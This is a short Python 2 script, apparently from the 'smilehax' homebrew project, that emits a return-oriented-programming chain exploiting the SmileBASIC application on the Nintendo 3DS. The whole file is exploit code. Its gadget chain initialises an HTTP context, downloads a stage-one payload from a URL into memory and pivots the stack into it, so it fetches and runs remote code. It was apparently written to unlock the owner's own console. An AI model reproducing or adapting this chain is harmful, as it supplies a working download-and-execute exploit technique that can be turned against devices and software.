#!/usr/bin/python2

# smilehax - smilebasic 3ds exploit
# plutoo 2016

from constants import *
from rop_generator import *

print 'OA$="<INSERT OTHERAPP HERE>"'

emit_hdr(INSTALLER_ROP_START)

emit_rop(INSTALLER_ROP_START, INSTALLER_ROP_END, INSTALLER_ROP_SAFE, [
    GADGET_R0,                # pop {r0, pc}
        HTTPC_STRUCT_PTR,         # r0, struct_ptr
    GADGET_R1R2R3R4R5,        # pop {r1-r5, pc}
        PtrToStr(INSTALLER_STAGE1_URL), # r1, www
        1,                        # r2, http_method=GET
        DontCare,                 # r3
        DontCare,                 # r4
        DontCare,                 # r5
    HTTPC_INITSTRUCT+4,       # httpc::InitStruct(...), also r3=use_proxy=true
        DontCare,                 # r3
        DontCare,                 # r4
        DontCare,                 # r5
        DontCare,                 # r6
        DontCare,                 # r7
        DontCare,                 # r8
        DontCare,                 # r9
    GADGET_POP_R4R5LR__BX_LR, # pop {r4, r5, lr}; bx lr
        DontCare,                 # r4
        DontCare,                 # r5
    GADGET_R0,                # pop {r0, pc}, also lr
        HTTPC_STRUCT_PTR,         # r0, struct_ptr
    HTTPC_BEGINREQUEST,       # httpc::BeginRequest(...)
        DontCare,                 # r0, from lr-gadget
    GADGET_R0,                # pop {r0, pc}
        HTTPC_STRUCT_PTR,         # r0, struct_ptr
    GADGET_R1R2R3R4R5,        # pop {r1-r3, pc}
        INSTALLER_STAGE1_BASE,    # r1, out_ptr
        INSTALLER_STAGE1_SIZE,    # r2, out_size
        DontCare,                 # r3
        DontCare,                 # r4
        DontCare,                 # r5
    HTTPC_RECVDATA,           # httpc::RecvData(...), also r3
        DontCare,                 # r0, from lr-gadget
    GADGET_R0,                # pop {r0, pc}
        INSTALLER_STAGE1_BASE,    # r0
    GADGET_R1,                # pop {r1, pc}
        GADGET_NOP,               # r1
    GADGET_MOV_SP_R0__MOV_R0_R2__BX_R1 # mov sp, r0; mov r0, r2; bx r1
])
